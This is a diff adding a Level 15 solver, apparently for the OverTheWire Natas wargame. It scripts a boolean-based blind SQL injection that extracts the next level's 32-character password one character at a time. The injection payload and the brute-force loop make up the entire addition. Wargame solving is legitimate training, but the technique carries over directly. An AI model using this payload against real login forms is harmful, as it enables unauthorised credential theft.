@@ -321,5 +321,32 @@ except requests.exceptions.RequestException as e:
   print(f"HTTP Request failed: {e}")
 
 # Level 15
+try:
+  charset = string.ascii_letters + string.digits
+  extracted_password = ""
+  print("\nLevel 15")
+  print("Sending SQL injection payload:") 
+  session = requests.Session()
+  session.auth = ("natas15",cred_dict["natas15"])
+  print("[*] Starting password extraction...")
+  for position in range(1, 33):
+    for char in charset:
+      payload = {
+        'username': f'natas16" AND BINARY SUBSTRING(password,{position},1)=\'{char}\' -- -'
+      }
+      # Send the request
+      response = session.post(url_dict["natas15"]+"/index.php", data=payload,auth=cred_dict["natas15"])
+      # Check if the character is correct (boolean response)
+      if "This user exists" in response.text:
+        extracted_password += char
+        print(f"[+] Found character {position}: {char} → Current: {extracted_password}")
+        break
+    if len(extracted_password) == 32:
+      print(f"Natas 16 Password found: {extracted_password}")
+      cred_dict["natas16"] = ("natas16",extracted_password)
+      break
+except requests.exceptions.RequestException as e:
+  print(f"HTTP Request failed: {e}")
+
 
 print(cred_dict)
